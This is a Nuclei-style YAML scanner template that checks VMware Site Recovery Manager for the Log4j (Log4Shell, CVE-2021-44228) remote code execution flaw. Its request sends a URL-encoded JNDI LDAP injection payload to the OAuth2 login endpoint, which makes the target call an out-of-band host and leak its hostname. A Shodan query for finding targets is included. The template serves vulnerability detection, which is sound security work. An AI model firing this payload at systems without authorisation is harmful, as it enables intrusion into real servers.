id: vmware-siterecovery-log4j-rce
info:
  author: akincibor
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  description: 'A critical vulnerability in Apache Log4j identified by CVE-2021-44228
    has been publicly disclosed that may allow for remote code execution in impacted
    VMware Site Recovery Manager.

    '
  metadata:
    shodan-query: title:"VMware Site Recovery Manager"
    verified: true
  name: VMware Site Recovery Manager - Log4j Remote Code Execution
  reference:
  - https://www.horizon3.ai/the-long-tail-of-log4shell-exploitation/
  - https://logging.apache.org/log4j/2.x/security.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  severity: critical
  tags: cve,cve2021,jndi,log4j,rce,oast,vmware
requests:
- extractors:
  - kval:
    - interactsh_ip
    type: kval
  - group: 1
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/dr/authentication/oauth2/oauth2login?error=%24%7Bjndi%3Aldap%3A%2F%2F%24%7BhostName%7D.{{interactsh-url}}%7D'
